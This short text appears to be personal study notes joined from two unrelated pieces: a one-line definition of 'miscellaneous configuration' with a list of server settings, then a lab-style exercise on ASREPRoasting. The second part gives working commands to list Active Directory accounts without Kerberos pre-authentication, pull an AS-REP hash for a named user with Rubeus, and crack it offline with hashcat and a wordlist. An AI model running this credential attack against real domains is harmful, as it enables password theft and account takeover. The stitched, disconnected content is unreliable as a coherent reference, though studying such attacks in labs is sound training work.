# “Miscellaneous configuration” simply means: various other settings or configurations that do not fit into a main category.

In a server configuration file, miscellaneous settings might include:

```
timezone
logging options
debug mode
temporary settings
custom parameters
```
Q:Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, 
crack the hash, and submit their cleartext password as your answer.

```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

2. Now retrieve the AS-REP with Rubeus.exe

```
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

3. Crack with hashcat

hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
